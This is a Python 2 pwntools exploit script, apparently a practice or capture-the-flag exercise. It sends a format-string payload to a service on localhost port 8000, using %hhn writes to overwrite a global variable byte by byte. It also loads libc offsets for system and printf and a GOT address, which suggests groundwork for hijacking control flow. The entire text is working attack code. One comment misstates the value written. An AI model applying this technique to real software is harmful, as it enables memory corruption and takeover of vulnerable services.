#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 8000)

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

system_off = libc.symbols['system']
printf_off = libc.symbols['printf']

printf_got = 0x804a00c

# x is a global variable, whose address can be determined in static time.
x_addr = 0x804a02c

'''
r.send(p32(x_addr) + # the lowest byte of x_addr
       p32(x_addr + 1) + # the second byte of x_addr
       '%100c' +
       '%6$n' +
       '%7$n' +
       '\n')
'''
# output 0x0000abcd
r.send(p32(x_addr) + p32(x_addr + 1) + p32(x_addr + 2) + p32(x_addr + 3) +
       # padding + {the n-th parameter}
       '%189c' + '%6$hhn' + # 16 + 189 = 205 = 0xcd
       '%222c' + '%7$hhn' + # 0xab - 0xcd + 256
       '%137c' + '%8$hhn' + # 0x34 - 0xab + 256
       '%222c' + '%9$hhn' + # 0x12 - 0x34 + 256
       '\n')
a = r.recvrepeat(0.1)
print a

r.interactive()

